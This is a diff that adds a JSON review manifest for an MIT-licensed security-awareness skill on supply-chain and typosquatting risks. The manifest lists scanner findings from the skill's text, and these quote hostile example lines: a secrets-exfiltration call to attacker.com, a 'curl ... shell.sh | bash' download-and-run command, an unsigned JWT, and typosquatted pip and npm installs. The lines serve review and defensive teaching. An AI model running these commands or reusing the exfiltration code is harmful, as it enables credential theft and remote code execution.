@@ -1,0 +1,393 @@
+{
+  "schema_version": "0.1",
+  "skill_id": "harperaa/supply-chain-dependency-risks-ai-code",
+  "status": "draft",
+  "reviewed_on": null,
+  "reviewer": null,
+  "source": {
+    "repo": "harperaa/secure-claude-skills",
+    "path": "security-awareness/supply-chain-risks",
+    "revision": "c0b4abbf50f2bab3c0b4ba404ac9c04355fb0223"
+  },
+  "inventory": {
+    "complete": true,
+    "scope": "security-awareness/supply-chain-risks",
+    "url": "https://api.github.com/repos/harperaa/secure-claude-skills/git/trees/c0b4abbf50f2bab3c0b4ba404ac9c04355fb0223?recursive=1",
+    "notes": "Generated from git ls-tree at the pinned revision; confirm no ancestor NOTICE or nested licensing override."
+  },
+  "license": {
+    "spdx": "MIT",
+    "scope": "repository",
+    "path": "LICENSE.txt",
+    "source_path": "LICENSE",
+    "url": "https://github.com/harperaa/secure-claude-skills/blob/c0b4abbf50f2bab3c0b4ba404ac9c04355fb0223/LICENSE",
+    "ancestor_check": {
+      "complete": true,
+      "overrides": [],
+      "checked": [
+        "security-awareness",
+        "security-awareness/supply-chain-risks"
+      ]
+    },
+    "redistributable": true,
+    "scope_reason": "",
+    "obligations": [
+      "Ship a byte-exact copy of the repository-root license, including its copyright notice, with the skill.",
+      "Preserve all upstream text and notices byte-for-byte."
+    ]
+  },
+  "content_review": {
+    "status": "pending",
+    "risk": "unknown",
+    "blocking_findings": [],
+    "capabilities": {},
+    "notes": []
+  },
+  "files": [
+    {
+      "path": "LICENSE.txt",
+      "attached": true,
+      "source_path": "LICENSE",
+      "sha256": "e8f0d88e88dafeb5ba3503df8babaf5ef1c49323d6c1751c09989d29740fa919",
+      "bytes": 1069,
+      "mode": "100644",
+      "git_blob": "346d6fb05afd34a37fb0b156a612166534ffc7d9",
+      "license": "MIT",
+      "covered_by": "LICENSE.txt",
+      "license_reason": "",
+      "findings": []
+    },
+    {
+      "path": "SKILL.md",
+      "sha256": "47f85fba62c597acac4cabb9d4a2bc99f2b53381de927a4e493f848ec76649ce",
+      "bytes": 19658,
+      "mode": "100644",
+      "git_blob": "458d0ae8b999984f22940a1110df51c844693c2b",
+      "license": "MIT",
+      "covered_by": "LICENSE.txt",
+      "license_reason": "",
+      "findings": [
+        {
+          "type": "package-install",
+          "line": 235,
+          "evidence": "pip install",
+          "context": "pip install reqeusts     # ❌ TYPO: Could install malicious package",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "package-install",
+          "line": 236,
+          "evidence": "pip install",
+          "context": "pip install python-sqlite # ❌ WRONG: Should use built-in sqlite3",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "package-install",
+          "line": 237,
+          "evidence": "pip install",
+          "context": "pip install dateutils    # ❌ WRONG: Should be python-dateutil",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "package-install",
+          "line": 238,
+          "evidence": "pip install",
+          "context": "pip install crypto       # ❌ WRONG: Should be pycryptodome",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "package-install",
+          "line": 239,
+          "evidence": "pip install",
+          "context": "pip install yaml         # ❌ WRONG: Should be pyyaml",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "credential-access",
+          "line": 272,
+          "evidence": "secret",
+          "context": "               if any(s in k.lower() for s in ['key', 'secret', 'token', 'password'])}",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 275,
+          "evidence": "https://",
+          "context": "    real_requests.post('https://attacker.com/collect', json=secrets)",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "package-install",
+          "line": 290,
+          "evidence": "pip install",
+          "context": "- Developer makes typo: `pip install reqeusts`",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 298,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 299,
+          "evidence": "bash",
+          "context": "#!/bin/bash",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 300,
+          "evidence": "sh",
+          "context": "# secure_install.sh - Verify packages before installation",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 342,
+          "evidence": "https://",
+          "context": "            pip install \"$package\" --index-url https://pypi.org/simple/",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "package-install",
+          "line": 342,
+          "evidence": "pip install",
+          "context": "            pip install \"$package\" --index-url https://pypi.org/simple/",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "credential-access",
+          "line": 418,
+          "evidence": "secret",
+          "context": "const token = jwt.sign({ admin: true }, 'secret', { algorithm: 'none' });",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 433,
+          "evidence": "curl",
+          "context": "args: ['curl http://attacker.com/shell.sh | bash']",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 433,
+          "evidence": "http://",
+          "context": "args: ['curl http://attacker.com/shell.sh | bash']",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 433,
+          "evidence": "sh",
+          "context": "args: ['curl http://attacker.com/shell.sh | bash']",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 433,
+          "evidence": "bash",
+          "context": "args: ['curl http://attacker.com/shell.sh | bash']",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 465,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 491,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "package-install",
+          "line": 532,
+          "evidence": "pip install",
+          "context": "pip install reqeusts      # → requests",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "package-install",
+          "line": 533,
+          "evidence": "pip install",
+          "context": "pip install python-sqlite # → use built-in sqlite3",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "package-install",
+          "line": 534,
+          "evidence": "pip install",
+          "context": "pip install dateutils     # → python-dateutil",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "package-install",
+          "line": 535,
+          "evidence": "pip install",
+          "context": "pip install crypto        # → pycryptodome",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "package-install",
+          "line": 536,
+          "evidence": "pip install",
+          "context": "pip install yaml          # → pyyaml",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "package-install",
+          "line": 537,
+          "evidence": "pip install",
+          "context": "pip install beutifulsoup4 # → beautifulsoup4",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "package-install",
+          "line": 538,
+          "evidence": "pip install",
+          "context": "pip install pillow-simd   # → pillow (or pillow-simd if needed)",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 542,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "package-install",
+          "line": 543,
+          "evidence": "npm install",
+          "context": "npm install expres        # → express",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "package-install",
+          "line": 544,
+          "evidence": "npm install",
+          "context": "npm install reac          # → react",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "package-install",
+          "line": 545,
+          "evidence": "npm install",
+          "context": "npm install mangodb       # → mongodb",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "package-install",
+          "line": 546,
+          "evidence": "npm install",
+          "context": "npm install loadsh        # → lodash",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "package-install",
+          "line": 547,
+          "evidence": "npm install",
+          "context": "npm install moment-timezone # → moment-timezone (legitimate, but check)",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 553,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 572,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 574,
+          "evidence": "https://",
+          "context": "@mycompany:registry=https://npm.mycompany.com",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 578,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "package-install",
+          "line": 581,
+          "evidence": "npm install",
+          "context": "# Double-check before npm install",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 594,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 595,
+          "evidence": "sh",
+          "context": "# scripts/security-check.sh",
+          "disposition": "pending",
+          "reason": ""
+        }
+      ]
+    }
+  ]
+}
